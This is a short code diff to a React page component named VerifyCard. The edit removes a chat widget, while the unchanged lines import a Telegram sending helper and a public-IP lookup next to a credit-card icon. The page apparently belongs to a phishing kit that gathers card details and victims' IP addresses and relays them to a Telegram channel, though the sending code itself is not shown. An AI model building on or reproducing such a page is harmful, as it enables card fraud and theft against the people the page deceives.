@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, CreditCard } from "lucide-react";
-import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { sendTelegram, getPublicIP } from "@/lib/telegram";
 
@@ -380,7 +379,6 @@ export default function VerifyCard() {
       </div>
 
       <RecaptchaBadge />
-      <ChatWidget />
     </div>
   );
 }
